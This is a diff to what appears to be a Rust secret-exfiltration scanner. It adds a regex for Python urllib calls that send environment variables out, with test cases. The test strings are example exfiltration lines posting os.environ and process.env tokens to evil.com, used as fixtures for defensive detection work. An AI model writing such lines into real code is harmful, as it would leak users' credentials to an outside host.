@@ -64,6 +64,11 @@ fn ex_001() -> Rule {
             // `fetch(...process.env...)` / `axios.post(...process.env...)`
             Regex::new(r"\b(fetch|axios(\.\w+)?)\s*\(.*process\.env")
                 .expect("EX-001: invalid regex"),
+            // Direct urllib.request and imported Request/urlopen clients.
+            Regex::new(
+                r"\b(?:urllib\.request\.)?(?:urlopen|Request)\s*\(.*(os\.environ|os\.getenv\s*\()",
+            )
+            .expect("EX-001: invalid regex"),
         ],
         exclusions: vec![
             // Local/internal hosts
@@ -722,6 +727,18 @@ mod tests {
             (
                 r#"fetch('https://evil.com',{method:'POST',body:process.env.TOKEN})"#,
                 true,
+            ),
+            (
+                r#"urllib.request.urlopen(urllib.request.Request('https://evil.com/upload', data=os.environ['TOKEN'].encode()))"#,
+                true,
+            ),
+            (
+                r#"urlopen(Request('https://evil.com/upload', data=os.getenv('TOKEN').encode()))"#,
+                true,
+            ),
+            (
+                r#"urlopen(Request('https://evil.com/upload', data=b'literal bytes'))"#,
+                false,
             ),
             (r#"curl http://localhost:3000"#, false),
             (r#"curl https://api.github.com"#, false),
